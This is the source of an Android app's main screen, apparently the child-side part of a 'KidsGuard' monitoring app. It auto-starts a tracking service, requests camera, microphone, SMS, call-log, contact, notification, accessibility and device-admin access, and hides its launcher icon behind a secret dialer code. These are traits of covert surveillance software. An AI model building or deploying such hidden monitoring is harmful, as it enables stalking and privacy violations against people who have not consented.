package com.kidsguard.child;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {

    SharedPreferences prefs;
    android.widget.TextView tvDeviceId;
    Button btnStartService;
    Button btnStopService;
    Button btnHideApp;
    Button btnPermissions;
    Button btnAccessibility;
    Button btnDeviceAdmin;
    Button btnNotifAccess;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences(LocationService.PREFS, 0);

        tvDeviceId = findViewById(R.id.tvDeviceId);
        btnStartService = findViewById(R.id.btnStartService);
        btnStopService = findViewById(R.id.btnStopService);
        btnHideApp = findViewById(R.id.btnHideApp);
        btnPermissions = findViewById(R.id.btnPermissions);
        btnAccessibility = findViewById(R.id.btnAccessibility);
        btnDeviceAdmin = findViewById(R.id.btnDeviceAdmin);
        btnNotifAccess = findViewById(R.id.btnNotifAccess);

        String deviceId = LocationService.getSafeDeviceId(this);
        tvDeviceId.setText("Device Code: " + deviceId);

        btnStartService.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startChildService();
            }
        });

        btnStopService.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                stopService(new Intent(MainActivity.this, LocationService.class));
                Toast.makeText(MainActivity.this, "Service stopped", Toast.LENGTH_SHORT).show();
            }
        });

        btnHideApp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showHideDialog();
            }
        });

        btnPermissions.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });

        btnAccessibility.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            }
        });

        btnDeviceAdmin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        new ComponentName(MainActivity.this, AdminReceiver.class));
                startActivity(intent);
            }
        });

        btnNotifAccess.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            }
        });

        // Auto-start service
        startChildService();
    }

    private void startChildService() {
        Intent i = new Intent(this, LocationService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(i);
        } else {
            startService(i);
        }
        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
    }

    private void showHideDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Hide App Icon")
                .setMessage("App icon will be hidden from launcher. " +
                        "Dial *#*#12345#*#* to reopen.")
                .setPositiveButton("HIDE", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        hideAppIcon();
                    }
                })
                .setNegativeButton("CANCEL", null)
                .show();
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName cn = new ComponentName(
                    this, "com.kidsguard.child.MainActivityLauncher");
            pm.setComponentEnabledSetting(
                    cn,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

            Toast.makeText(this,
                    "App hidden. Dial *#*#12345#*#* to reopen.",
                    Toast.LENGTH_LONG).show();

            // Go home
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(home);

        } catch (Exception e) {
            Toast.makeText(this, "Hide failed: " + e.getMessage(),
                    Toast.LENGTH_LONG).show();
        }
    }

    private void requestAllPermissions() {
        if (Build.VERSION.SDK_INT >= 23) {
            java.util.List<String> neededList = new java.util.ArrayList<>();
            String[] allPerms = {
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION,
                    android.Manifest.permission.CAMERA,
                    android.Manifest.permission.RECORD_AUDIO,
                    android.Manifest.permission.READ_SMS,
                    android.Manifest.permission.RECEIVE_SMS,
                    android.Manifest.permission.READ_CALL_LOG,
                    android.Manifest.permission.READ_CONTACTS,
                    android.Manifest.permission.READ_PHONE_STATE,
                    android.Manifest.permission.ANSWER_PHONE_CALLS,
                    android.Manifest.permission.CALL_PHONE,
            };

            for (String p : allPerms) {
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    neededList.add(p);
                }
            }

            if (Build.VERSION.SDK_INT >= 33) {
                String[] api33Perms = {
                        android.Manifest.permission.POST_NOTIFICATIONS,
                        android.Manifest.permission.READ_MEDIA_IMAGES,
                        android.Manifest.permission.READ_MEDIA_VIDEO,
                        android.Manifest.permission.READ_MEDIA_AUDIO,
                };
                for (String p : api33Perms) {
                    if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                        neededList.add(p);
                    }
                }
            }

            if (!neededList.isEmpty()) {
                requestPermissions(neededList.toArray(new String[0]), 101);
            } else {
                Toast.makeText(this, "Standard runtime permissions already granted", Toast.LENGTH_SHORT).show();
            }
        }

        // Usage stats permission
        if (!hasUsageStatsPermission()) {
            Toast.makeText(this, "Please enable Usage Access permission", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        } else if (!isNotificationListenerEnabled()) {
            Toast.makeText(this, "Please enable Notification Access permission", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        } else {
            Toast.makeText(this, "Checking special access permissions...", Toast.LENGTH_SHORT).show();
        }

        // Battery optimization
        if (Build.VERSION.SDK_INT >= 23) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
            try { startActivity(intent); } catch (Exception ignored) {}
        }
    }

    private boolean isNotificationListenerEnabled() {
        String pkgName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(pkgName);
    }

    private boolean hasUsageStatsPermission() {
        try {
            android.app.usage.UsageStatsManager usm =
                    (android.app.usage.UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            long now = System.currentTimeMillis();
            java.util.List<android.app.usage.UsageStats> stats =
                    usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY,
                            now - 60000, now);
            return stats != null && !stats.isEmpty();
        } catch (Exception e) {
            return false;
        }
    }
}
